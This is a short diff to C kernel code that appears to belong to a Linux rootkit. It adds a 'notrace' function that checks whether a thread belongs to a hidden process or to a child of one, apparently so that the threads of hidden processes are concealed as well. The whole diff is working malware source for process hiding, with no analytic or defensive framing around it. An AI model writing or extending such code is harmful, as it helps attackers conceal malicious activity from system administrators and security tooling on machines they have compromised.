@@ -188,3 +188,22 @@ notrace int is_hidden_pid(int pid) {
 
     return found;
 }
+
+notrace int pid_is_thread(int tid) {
+    struct task_struct *task;
+    int tgid = 0;
+
+    if (tid <= 0)
+        return 0;
+
+    rcu_read_lock();
+    task = pid_task(find_vpid(tid), PIDTYPE_PID);
+    if (task)
+        tgid = task->tgid;
+    rcu_read_unlock();
+
+    if (tgid == 0 || tgid == tid)
+        return 0;
+
+    return is_hidden_pid(tgid) || is_child_pid(tgid);
+}
